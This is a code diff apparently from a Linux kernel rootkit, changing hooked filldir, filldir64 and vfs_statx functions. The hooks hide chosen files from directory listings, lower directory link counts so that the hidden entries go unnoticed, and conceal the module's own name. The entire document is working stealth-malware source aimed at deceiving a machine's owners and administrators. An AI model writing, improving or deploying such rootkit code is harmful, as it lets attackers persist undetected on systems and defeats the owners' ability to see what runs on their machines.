@@ -742,7 +742,7 @@ static int m_filldir(struct dir_context *ctx, const char *name, int namlen,loff_
      * in multiple directories, thus inode number may
      * be updated to the current directory being listed
      */
-    if (fs_search_and_update(name, ino, d_type == DT_DIR))
+    if (fs_search_name(name, ino))
         return 0;
     return real_filldir(ctx, name, namlen, offset, ino, d_type);
 }
@@ -755,12 +755,13 @@ static int  (*real_filldir64)(struct dir_context *, const char *, int, loff_t, u
 static int m_filldir64(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned int d_type) {
 #endif
 
-    if (fs_search_and_update(name, ino, d_type == DT_DIR))
-        goto match;
+    if (fs_search_name(name, ino))
+        return 0;
 
     return real_filldir64(ctx, name, namlen, offset, ino, d_type);
 
 match:
+    prinfo("Hiding '%s' from ino=%llu\n", name, ino);
     return 0;
 }
 
@@ -1013,7 +1014,17 @@ static long m_vfs_statx(int dfd, const char __user *filename, int flags, struct 
     /** size is more than enough for what is needed here. */
     char kernbuf[PROCNAME_MAXLEN+6] = {0};
 
+    long rv = real_vfs_statx(dfd, filename, flags, stat, request_mask);
+
     if (!copy_from_user((void*)kernbuf, filename, sizeof(kernbuf)-1)) {
+
+        if (strlen(kernbuf) > 0 && S_ISDIR(stat->mode)) {
+            int count = fs_is_dir_inode_hidden((const char *)kernbuf, stat->ino);
+            if (count > 0) {
+                prinfo("%s: file match ino=%llu nlink=%d count=%d\n", __func__, stat->ino, stat->nlink, count);
+                stat->nlink -= count;
+            }
+        }
 
         /** we don't exist */
         if (strstr(kernbuf, PROCNAME))
@@ -1021,7 +1032,7 @@ static long m_vfs_statx(int dfd, const char __user *filename, int flags, struct 
     }
 
     /** return normal */
-    return real_vfs_statx(dfd, filename, flags, stat, request_mask);
+    return rv;
 }
 
 /**
